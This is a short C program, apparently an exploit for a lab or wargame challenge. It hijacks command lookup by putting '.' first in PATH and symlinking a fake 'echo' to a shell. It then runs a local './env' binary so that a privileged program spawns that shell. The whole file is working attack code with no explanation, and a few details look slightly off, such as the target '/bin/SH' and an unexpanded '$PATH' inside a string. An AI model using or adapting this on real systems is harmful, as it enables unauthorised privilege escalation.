#include <sys/types.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <stdlib.h>

int main(int argc, char * argv[])
{

    setenv("PATH",".:$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/snap/bin", 1);
    //putenv("PATH=.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/snap/bin");

    symlink("/bin/SH", "echo");

    pid_t pid = fork();
    if (pid == 0)
    {
        // this is the child process
        char * argv[] = { "./env","SpawnShell", NULL };
        execv(argv[0], argv);
    }
    // else if (pid == -1) fork failed, throw an error!
    
    int status;
    wait(&status);
    unlink("echo");


    return 0;
}
